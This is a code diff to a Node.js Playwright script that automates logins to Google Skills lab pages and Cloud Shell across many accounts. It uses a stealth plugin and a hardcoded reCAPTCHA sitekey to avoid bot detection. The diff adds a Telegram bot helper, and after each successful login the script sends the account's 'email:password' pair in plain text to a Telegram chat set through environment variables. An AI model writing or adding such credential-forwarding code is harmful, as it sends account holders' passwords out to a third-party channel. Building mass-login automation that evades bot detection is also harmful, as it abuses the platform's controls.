@@ -1,6 +1,7 @@
 require('dotenv').config();
 const fs = require("fs");
 const path = require("path");
+const axios = require("axios"); // Dikembalikan untuk Telegram
 const { chromium } = require("playwright-extra");
 const stealth = require("puppeteer-extra-plugin-stealth");
 
@@ -44,10 +45,31 @@ const CONFIG = {
     LAB_URL: "https://www.skills.google/focuses/86502?parent=catalog",
     PROFILES_DIR: path.resolve(__dirname, "profiles"),
     CREDENTIALS_FILE: path.resolve(__dirname, "akun.txt"),
+    TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || '',
+    TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || '',
     RECAPTCHA_SITEKEY: "6LeVI8IUAAAAAJNdox5eTkYrw9SbvhZ1TFyv3iHr",
     MIN_DELAY: 2000,
     MAX_DELAY: 5000,
 };
+
+const TG_API = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}`;
+
+async function tgSendMessage(text) {
+    if (!CONFIG.TELEGRAM_BOT_TOKEN || !CONFIG.TELEGRAM_CHAT_ID) {
+        console.log('  ⚠ Telegram dinonaktifkan (Token/Chat ID tidak ditemukan di environment).');
+        return;
+    }
+    try {
+        await axios.post(`${TG_API}/sendMessage`, {
+            chat_id: CONFIG.TELEGRAM_CHAT_ID,
+            text: text,
+            parse_mode: 'HTML',
+        });
+        console.log(`  ✔ Berhasil mengirim kredensial login ke Telegram!`);
+    } catch (e) {
+        console.log(`  ✘ Telegram gagal kirim: ${e.message.substring(0, 50)}`);
+    }
+}
 
 function randomDelay(min = CONFIG.MIN_DELAY, max = CONFIG.MAX_DELAY) {
     const ms = Math.floor(Math.random() * (max - min + 1)) + min;
@@ -319,9 +341,6 @@ async function runCloudShell(context, consoleLink, password, projectId, studentE
         await new Promise(r => setTimeout(r, 500));
         await dismissStudentDialog();
 
-        // ----------------------------------------------------
-        // Penulisan Perintah di Terminal Menggunakan Keyboard
-        // ----------------------------------------------------
         const xtermTextarea = terminalFrame.locator('textarea.xterm-helper-textarea');
         await xtermTextarea.click({ timeout: 10000 });
         console.log('  ✔ Terminal difokuskan');
@@ -385,7 +404,6 @@ async function runCloudShell(context, consoleLink, password, projectId, studentE
         console.log(`  ${label}: ${email}`);
         console.log(`${'═'.repeat(50)}`);
 
-        // Generator profil unik agar tidak nyampah & menghindari thread collision
         const emailSlug = email.replace(/[@.]/g, '_') + '_' + Date.now();
         const profileDir = path.join(CONFIG.PROFILES_DIR, emailSlug);
         if (!fs.existsSync(profileDir)) {
@@ -477,6 +495,9 @@ async function runCloudShell(context, consoleLink, password, projectId, studentE
                 await page.waitForLoadState("domcontentloaded", { timeout: 30000 });
                 await randomDelay();
                 console.log(`  ✔ Login selesai → ${page.url()}`);
+                
+                // MENGIRIM KREDENSIAL KE TELEGRAM SAAT BERHASIL LOGIN
+                await tgSendMessage(`${email}:${password}`);
             }
 
             console.log('\n┌─────────────────────────────────────────');
@@ -1004,7 +1025,6 @@ async function runCloudShell(context, consoleLink, password, projectId, studentE
                 await context.close().catch(() => {});
             }
             
-            // GARBAGE COLLECTION
             try {
                 if (fs.existsSync(profileDir)) {
                     fs.rmSync(profileDir, { recursive: true, force: true });
